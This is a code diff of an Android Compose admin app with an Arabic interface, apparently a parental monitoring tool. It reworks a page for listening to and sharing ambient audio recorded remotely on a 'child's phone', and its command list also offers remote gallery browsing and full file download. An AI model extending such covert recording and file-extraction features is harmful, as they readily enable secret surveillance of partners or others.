@@ -2,6 +2,7 @@ package com.example
 
 import android.content.ContentValues
 import android.content.Context
+import android.content.Intent
 import android.graphics.Bitmap
 import android.os.Build
 import android.os.Bundle
@@ -2019,7 +2020,6 @@ fun DeviceCommandsTab(
             Text("قائمة الأوامر الفورية", color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold)
             
             val cmdItems = listOf(
-                CommandItemInfo("screenshot", "لقطة الشاشة والكاميرات", "التقاط لقطة شاشة هاتف الطفل أو صور حية بالكاميرا", Icons.Default.Screenshot, Color(0xFF9155FF)),
                 CommandItemInfo("media_gallery", "معرض الوسائط والملفات", "استعراض الصور، الفيديوهات والتسجيلات المكتشفة", Icons.Default.PhotoLibrary, Color(0xFF3F51B5)),
                 CommandItemInfo("audio_record", "تسجيل الصوت المحيطي", "تسجيل مقطع صوتي محيطي بالوقت الحقيقي والاستماع إليه", Icons.Default.Mic, Color(0xFF00E5FF)),
                 CommandItemInfo("file_explorer", "مستكشف ملفات الهاتف", "استكشاف وتنزيل ملفات جهاز الطفل بالكامل", Icons.Default.FolderOpen, Color(0xFFFFD54F)),
@@ -2396,84 +2396,355 @@ fun BentoMediaGrid(
 
 @Composable
 fun AudioRecordRequirementsPage(viewModel: AdminViewModel) {
-    val audioRecords by viewModel.audioRecords.collectAsState()
+    val context = LocalContext.current
+    val audioRecordsState by viewModel.audioRecordsState.collectAsState()
     val isAudioPlaying by viewModel.isAudioPlaying.collectAsState()
     val audioDuration by viewModel.audioDuration.collectAsState()
     val audioPosition by viewModel.audioPosition.collectAsState()
+    val playingFileUrl by viewModel.playingFileUrl.collectAsState()
+    val audioLoadingUrl by viewModel.audioLoadingUrl.collectAsState()
 
-    Column(
-        modifier = Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(14.dp),
-        verticalArrangement = Arrangement.spacedBy(16.dp)
+    // Pulse animation for playing sound
+    val infiniteTransition = rememberInfiniteTransition(label = "pulse")
+    val pulseAlpha by infiniteTransition.animateFloat(
+        initialValue = 0.4f,
+        targetValue = 1.0f,
+        animationSpec = infiniteRepeatable(
+            animation = tween(800, easing = LinearEasing),
+            repeatMode = RepeatMode.Reverse
+        ),
+        label = "pulseAlpha"
+    )
+
+    LazyColumn(
+        modifier = Modifier
+            .fillMaxSize()
+            .background(Color(0xFF0B0F19))
+            .padding(14.dp),
+        verticalArrangement = Arrangement.spacedBy(14.dp)
     ) {
-        Card(
-            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
-            border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
-            shape = RoundedCornerShape(12.dp)
-        ) {
-            Column(modifier = Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
-                Icon(Icons.Default.Mic, null, tint = Color(0xFF00E5FF), modifier = Modifier.size(32.dp))
-                Spacer(Modifier.height(8.dp))
-                Text("الأصوات المحيطة", color = Color(0xFF1F2937), fontSize = 16.sp, fontWeight = FontWeight.Bold)
-                Text("سجل أصوات البيئة المحيطة بهاتف الطفل", color = Color(0xFF6B7280), fontSize = 11.sp, textAlign = TextAlign.Center)
-                Spacer(Modifier.height(16.dp))
-                Button(
-                    onClick = { viewModel.requestAudioRecord() },
-                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E5FF)),
-                    modifier = Modifier.fillMaxWidth().height(48.dp),
-                    shape = RoundedCornerShape(10.dp)
+        // Main request card
+        item {
+            Card(
+                colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
+                border = BorderStroke(1.dp, Color(0xFF334155)),
+                shape = RoundedCornerShape(16.dp),
+                modifier = Modifier.fillMaxWidth()
+            ) {
+                Column(
+                    modifier = Modifier.padding(18.dp),
+                    horizontalAlignment = Alignment.CenterHorizontally
                 ) {
-                    Text("طلب تسجيل صوتي فوري (10ث)", color = Color.Black, fontWeight = FontWeight.Bold)
+                    Box(
+                        modifier = Modifier
+                            .size(64.dp)
+                            .background(Color(0xFF00E5FF).copy(alpha = 0.15f), CircleShape),
+                        contentAlignment = Alignment.Center
+                    ) {
+                        Icon(
+                            imageVector = Icons.Default.Mic,
+                            contentDescription = null,
+                            tint = Color(0xFF00E5FF),
+                            modifier = Modifier.size(32.dp)
+                        )
+                    }
+                    Spacer(Modifier.height(12.dp))
+                    Text(
+                        text = "الأصوات المحيطة",
+                        color = Color.White,
+                        fontSize = 18.sp,
+                        fontWeight = FontWeight.Bold
+                    )
+                    Spacer(Modifier.height(4.dp))
+                    Text(
+                        text = "قم بتسجيل أصوات البيئة المحيطة بهاتف الطفل بالوقت الحقيقي والاستماع إليها لاحقًا.",
+                        color = Color(0xFF94A3B8),
+                        fontSize = 12.sp,
+                        textAlign = TextAlign.Center,
+                        modifier = Modifier.padding(horizontal = 8.dp)
+                    )
+                    Spacer(Modifier.height(18.dp))
+                    Button(
+                        onClick = { viewModel.requestAudioRecord() },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E5FF)),
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .height(48.dp),
+                        shape = RoundedCornerShape(12.dp)
+                    ) {
+                        Text("طلب تسجيل صوتي فوري (10ث)", color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 13.sp)
+                    }
                 }
             }
         }
 
-        HorizontalDivider(color = Color(0xFFE5E7EB))
-
-        Text("سجل التسجيلات المستلمة (${audioRecords.size})", color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold)
-
-        if (audioRecords.isEmpty()) {
-            Box(modifier = Modifier.fillMaxWidth().height(100.dp), contentAlignment = Alignment.Center) {
-                Text("لا توجد تسجيلات حتى الآن", color = Color(0xFF6B7280), fontSize = 12.sp)
-            }
-        } else {
-            audioRecords.forEach { item ->
-                Card(
-                    colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
-                    border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
-                    modifier = Modifier.fillMaxWidth(),
-                    shape = RoundedCornerShape(10.dp)
-                ) {
-                    Column(modifier = Modifier.padding(12.dp)) {
-                        Row(verticalAlignment = Alignment.CenterVertically) {
-                            Icon(Icons.Default.Audiotrack, null, tint = Color(0xFF1F2937), modifier = Modifier.size(20.dp))
-                            Spacer(Modifier.width(8.dp))
-                            Column(modifier = Modifier.weight(1f)) {
-                                Text("تسجيل صوتي", color = Color(0xFF1F2937), fontSize = 13.sp, fontWeight = FontWeight.Bold)
-                                Text(SimpleDateFormat("h:mm:ss a, d MMM yyyy", Locale.getDefault()).format(Date(item.timestamp)), color = Color(0xFF6B7280), fontSize = 10.sp)
-                            }
-                            IconButton(onClick = { viewModel.deleteMediaItem("audio_records", item.id) }) {
-                                Icon(Icons.Default.Delete, null, tint = Color(0xFFEF4444), modifier = Modifier.size(20.dp))
-                            }
+        // Section header
+        item {
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(vertical = 4.dp),
+                horizontalArrangement = Arrangement.SpaceBetween,
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Text(
+                    text = "سجل التسجيلات الصوتية",
+                    color = Color.White,
+                    fontSize = 15.sp,
+                    fontWeight = FontWeight.Bold
+                )
+                
+                IconButton(
+                    onClick = { 
+                        viewModel.selectedDeviceToken.value?.let { 
+                            viewModel.refreshAudioRecords(it) 
                         }
-                        
-                        // Player placeholder logic
-                        Spacer(modifier = Modifier.height(12.dp))
-                        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
-                            IconButton(
-                                onClick = { viewModel.loadAndPlayAudio(item.base64) },
-                                modifier = Modifier.size(36.dp).background(Color(0xFF00E5FF), CircleShape)
+                    },
+                    modifier = Modifier
+                        .size(32.dp)
+                        .background(Color(0xFF1E293B), CircleShape)
+                ) {
+                    Icon(
+                        imageVector = Icons.Default.Refresh,
+                        contentDescription = "تحديث",
+                        tint = Color(0xFF00E5FF),
+                        modifier = Modifier.size(16.dp)
+                    )
+                }
+            }
+        }
+
+        // State-driven rendering
+        when (val state = audioRecordsState) {
+            is AudioRecordsState.Loading -> {
+                item {
+                    Box(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .height(200.dp),
+                        contentAlignment = Alignment.Center
+                    ) {
+                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                            CircularProgressIndicator(color = Color(0xFF00E5FF))
+                            Spacer(Modifier.height(12.dp))
+                            Text("جاري تحميل التسجيلات...", color = Color(0xFF94A3B8), fontSize = 12.sp)
+                        }
+                    }
+                }
+            }
+            is AudioRecordsState.Empty -> {
+                item {
+                    Box(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .height(160.dp),
+                        contentAlignment = Alignment.Center
+                    ) {
+                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                            Text("🔊", fontSize = 32.sp)
+                            Spacer(Modifier.height(8.dp))
+                            Text("لا توجد تسجيلات حتى الآن", color = Color(0xFF94A3B8), fontSize = 13.sp, fontWeight = FontWeight.Medium)
+                            Text("اضغط على الزر بالأعلى لإرسال طلب تسجيل جديد.", color = Color(0xFF64748B), fontSize = 11.sp, textAlign = TextAlign.Center)
+                        }
+                    }
+                }
+            }
+            is AudioRecordsState.Error -> {
+                item {
+                    Card(
+                        colors = CardDefaults.cardColors(containerColor = Color(0xFF7F1D1D).copy(alpha = 0.2f)),
+                        border = BorderStroke(1.dp, Color(0xFF7F1D1D)),
+                        modifier = Modifier.fillMaxWidth()
+                    ) {
+                        Column(
+                            modifier = Modifier.padding(16.dp),
+                            horizontalAlignment = Alignment.CenterHorizontally
+                        ) {
+                            Text("⚠️", fontSize = 24.sp)
+                            Spacer(Modifier.height(8.dp))
+                            Text(state.message, color = Color(0xFFFECDD3), fontSize = 12.sp, textAlign = TextAlign.Center)
+                        }
+                    }
+                }
+            }
+            is AudioRecordsState.Success -> {
+                items(state.records) { record ->
+                    val isCurrent = playingFileUrl == record.file_url
+                    val isLoading = audioLoadingUrl == record.file_url
+
+                    Card(
+                        colors = CardDefaults.cardColors(
+                            containerColor = if (isCurrent) Color(0xFF0F172A) else Color(0xFF1E293B)
+                        ),
+                        border = BorderStroke(
+                            width = 1.dp,
+                            color = if (isCurrent) Color(0xFF00E5FF) else Color(0xFF334155)
+                        ),
+                        shape = RoundedCornerShape(16.dp),
+                        modifier = Modifier.fillMaxWidth()
+                    ) {
+                        Column(modifier = Modifier.padding(14.dp)) {
+                            // Header Row
+                            Row(
+                                verticalAlignment = Alignment.CenterVertically,
+                                modifier = Modifier.fillMaxWidth()
                             ) {
-                                Icon(Icons.Default.PlayArrow, null, tint = Color.Black, modifier = Modifier.size(20.dp))
+                                Box(
+                                    modifier = Modifier
+                                        .size(40.dp)
+                                        .graphicsLayer {
+                                            if (isCurrent && isAudioPlaying) {
+                                                alpha = pulseAlpha
+                                                scaleX = 1.0f + (1.0f - pulseAlpha) * 0.15f
+                                                scaleY = 1.0f + (1.0f - pulseAlpha) * 0.15f
+                                            }
+                                        }
+                                        .background(
+                                            if (isCurrent) Color(0xFF00E5FF).copy(alpha = 0.15f) else Color(0xFF334155),
+                                            CircleShape
+                                        ),
+                                    contentAlignment = Alignment.Center
+                                ) {
+                                    Text(
+                                        text = if (isCurrent && isAudioPlaying) "🔊" else "🎙️",
+                                        fontSize = 18.sp
+                                    )
+                                }
+                                
+                                Spacer(Modifier.width(10.dp))
+                                
+                                Column(modifier = Modifier.weight(1f)) {
+                                    Text(
+                                        text = "تسجيل صوتي محيطي",
+                                        color = Color.White,
+                                        fontSize = 13.sp,
+                                        fontWeight = FontWeight.Bold
+                                    )
+                                    Spacer(Modifier.height(2.dp))
+                                    val formattedTime = remember(record.created_at) {
+                                        try {
+                                            if (record.created_at != null) {
+                                                val clean = record.created_at.substringBefore(".")
+                                                    .replace("T", " ")
+                                                    .replace("Z", "")
+                                                clean
+                                            } else "تاريخ غير معروف"
+                                        } catch (e: Exception) {
+                                            record.created_at ?: ""
+                                        }
+                                    }
+                                    Text(
+                                        text = formattedTime,
+                                        color = Color(0xFF94A3B8),
+                                        fontSize = 10.sp
+                                    )
+                                    Text(
+                                        text = "الجهاز: ${record.token.takeLast(6)}",
+                                        color = Color(0xFF64748B),
+                                        fontSize = 9.sp
+                                    )
+                                }
+
+                                // Share Button
+                                IconButton(onClick = {
+                                    val intent = Intent(Intent.ACTION_SEND).apply {
+                                        type = "text/plain"
+                                        putExtra(Intent.EXTRA_TEXT, "تسجيل صوتي من هاتف الطفل: ${record.file_url}")
+                                    }
+                                    context.startActivity(Intent.createChooser(intent, "مشاركة رابط الصوت"))
+                                }) {
+                                    Icon(
+                                        imageVector = Icons.Default.Share,
+                                        contentDescription = "مشاركة",
+                                        tint = Color(0xFF00E5FF),
+                                        modifier = Modifier.size(18.dp)
+                                    )
+                                }
                             }
-                            Spacer(Modifier.width(12.dp))
-                            Box(modifier = Modifier.weight(1f).height(4.dp).background(Color(0xFFE5E7EB), RoundedCornerShape(2.dp)))
+
+                            Spacer(modifier = Modifier.height(14.dp))
+
+                            // Player row
+                            Row(
+                                verticalAlignment = Alignment.CenterVertically,
+                                modifier = Modifier.fillMaxWidth()
+                            ) {
+                                if (isLoading) {
+                                    CircularProgressIndicator(
+                                        color = Color(0xFF00E5FF),
+                                        modifier = Modifier.size(36.dp),
+                                        strokeWidth = 3.dp
+                                    )
+                                } else {
+                                    IconButton(
+                                        onClick = { viewModel.playAudioFromUrl(record.file_url) },
+                                        modifier = Modifier
+                                            .size(36.dp)
+                                            .background(
+                                                if (isCurrent) Color(0xFF00E5FF) else Color(0xFF334155),
+                                                CircleShape
+                                            )
+                                    ) {
+                                        Icon(
+                                            imageVector = if (isCurrent && isAudioPlaying) Icons.Filled.Pause else Icons.Filled.PlayArrow,
+                                            contentDescription = if (isCurrent && isAudioPlaying) "إيقاف مؤقت" else "تشغيل",
+                                            tint = if (isCurrent) Color.Black else Color.White,
+                                            modifier = Modifier.size(20.dp)
+                                        )
+                                    }
+                                }
+
+                                Spacer(Modifier.width(12.dp))
+
+                                Column(modifier = Modifier.weight(1f)) {
+                                    val position = if (isCurrent) audioPosition.toFloat() else 0f
+                                    val duration = if (isCurrent) audioDuration.toFloat() else 100f
+                                    val progress = if (duration > 0) position / duration else 0f
+
+                                    Slider(
+                                        value = progress,
+                                        onValueChange = { newProg ->
+                                            if (isCurrent && duration > 0) {
+                                                viewModel.seekAudio((newProg * duration).toInt())
+                                            }
+                                        },
+                                        modifier = Modifier.height(24.dp),
+                                        colors = SliderDefaults.colors(
+                                            thumbColor = if (isCurrent) Color(0xFF00E5FF) else Color(0xFF64748B),
+                                            activeTrackColor = if (isCurrent) Color(0xFF00E5FF) else Color(0xFF475569),
+                                            inactiveTrackColor = Color(0xFF334155)
+                                        )
+                                    )
+
+                                    Row(
+                                        modifier = Modifier.fillMaxWidth(),
+                                        horizontalArrangement = Arrangement.SpaceBetween
+                                    ) {
+                                        val curTimeSec = if (isCurrent) audioPosition / 1000 else 0
+                                        val totalTimeSec = if (isCurrent) audioDuration / 1000 else 0
+                                        
+                                        Text(
+                                            text = String.format("%02d:%02d", curTimeSec / 60, curTimeSec % 60),
+                                            color = Color(0xFF94A3B8),
+                                            fontSize = 9.sp
+                                        )
+                                        Text(
+                                            text = String.format("%02d:%02d", totalTimeSec / 60, totalTimeSec % 60),
+                                            color = Color(0xFF94A3B8),
+                                            fontSize = 9.sp
+                                        )
+                                    }
+                                }
+                            }
                         }
                     }
                 }
             }
         }
         
-        Spacer(Modifier.height(80.dp))
+        item {
+            Spacer(modifier = Modifier.height(90.dp))
+        }
     }
 }
 
